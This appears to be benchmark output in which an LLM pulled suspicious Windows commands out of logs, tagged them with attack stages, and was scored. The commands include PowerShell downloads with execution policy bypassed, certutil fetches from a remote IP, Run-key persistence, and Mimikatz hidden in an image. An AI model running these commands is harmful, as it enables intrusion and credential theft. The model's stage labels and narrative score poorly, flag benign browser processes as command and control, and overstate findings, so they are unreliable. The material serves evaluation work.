@@ -1,0 +1,187 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Windows\\System32\\Notepad.exe D:\\Log\\apt-new.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Windows\\System32\\DLLHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=1996 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:8 ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=268904263750 --mojo-platform-channel-handle=3432 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=268904407689 --mojo-platform-channel-handle=4004 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=268908170153 --mojo-platform-channel-handle=6004 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=12 --launch-time-ticks=268908350938 --mojo-platform-channel-handle=5472 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=13 --launch-time-ticks=268909056521 --mojo-platform-channel-handle=6356 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=utility --utility-sub-type=audit.mojom.AuditService --lang=zh-CN --service-sandbox-type=service --mojo-platform-channel-handle=5344 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:8",
+        "stage": "Collection"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --launch-time-ticks=286902107514 --mojo-platform-channel-handle=5920 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=15 --launch-time-ticks=286902958684 --mojo-platform-channel-handle=3508 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "msedge.exe --type=receiver --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=17 --launch-time-ticks=286903055063 --mojo-platform-channel-handle=6524 --field-trial-handle=2156,i,16606226776894730883,12741618594782312933,131072 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u300e\u308d\u3060\\u6e9d\u7528\\B.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/T1218.005.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powercfg.exe->rundll32.exe Shell32.dll,Control_RunDLL powercfg.cpl,,4",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=C:",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=C:& mkdir C:\\Windows\\Temp\\vssstore \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Atomic Red Team /t REG_SZ /F /D C:\\Path\\AtomicRedTeam.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"get-service > $env:TEMP\\T1119_1.txt get-childitem env:> $env:TEMP\\T1119_2.txt get-process > $env:TEMP\\T1119_3.txt\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/TEST.hta -method POST-usebasicparsing-contenttype application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs > $env:TEMP\\T1059.005.out.txt\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWs NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS /V verifierdlls /D 1 /F\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWs NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS /V verifierdlls/F\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"import-module .\\Invoke-PSImage.ps1:invoke-psimage -script .\\Invoke-Mimikatz.ps1-out .\\evil-kiwi.png-image .\\995647.jpg\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "CertUtil -UrlCache -Split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "pgAdmin4.exe --type=utility --utility-sub-type=network.mojom.NetworkService --lang=zh-CN --service-sandbox-type=network --no-sandbox --user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data --nwapp-path=D:\\Postgres\\pgAdmin 4\\bin --start-stack-profiler --mojo-platform-channel-handle=1928 /prefetch:8",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "pluginhost.dll -> shell32.dll,Extract AndSave ShellLinkInMemory",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "pgAdmin4.exe --type=renderer --no-sandbox --file-url-path-alias=/gen=D:\\Postgres\\pgAdmin 4\\bin\\gen --no-zygote --field-trial-handle=1728,1535408556641006900,2011371930731671617,131072 --disable-gpu-compositing --lang=zh-CN --user-data-dir=C:\\Users\\Administrator\\AppData\\Local\\pgadmin4\\User Data --nwapp-path=D:\\Postgres\\pgAdmin 4\\bin --nwjs --extension-process --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --mojo-platform-channel-handle=2496 /prefetch:1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "The attackers initially accessed the system through an unknown vector, possibly using PowerShell to execute a script via an HTTP request. They created various forms of persistence, such as registry keys and scheduled tasks, and used Edge browser extensions to communicate with their C2 server. The attackers also executed commands on the victim machine and collected sensitive information such as user credentials and system details.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 180115,
+      "completion_tokens": 8183,
+      "total_tokens": 188298,
+      "wall_clock_s": 83.502,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.11764705882352941,
+      "recall": 0.10810810810810811,
+      "f1": 0.11267605633802817,
+      "tp": 4,
+      "fp": 30,
+      "fn": 33
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 34,
+      "fn": 37,
+      "recall_partial": 0.05405405405405406
+    },
+    "hallucination_rate": 0.2972972972972973,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 180115,
+      "completion_tokens": 8183,
+      "total_tokens": 188298,
+      "wall_clock_s": 83.502,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
